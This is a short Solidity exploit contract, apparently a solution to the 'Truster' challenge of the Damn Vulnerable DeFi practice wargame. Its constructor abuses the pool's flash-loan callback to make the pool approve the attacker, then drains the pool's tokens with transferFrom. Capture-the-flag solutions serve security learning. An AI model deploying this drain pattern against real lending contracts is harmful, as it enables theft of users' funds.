// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {IERC20} from "../../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract Attack {
    TrusterLenderPool private lenderPool;
    IERC20 private token;

    constructor(address _lenderPool, uint256 _amount) {
        lenderPool = TrusterLenderPool(_lenderPool);
        token = lenderPool.damnValuableToken();

        lenderPool.flashLoan(
            0, msg.sender, address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), _amount)
        );

        token.transferFrom(_lenderPool, msg.sender, _amount);
    }
}
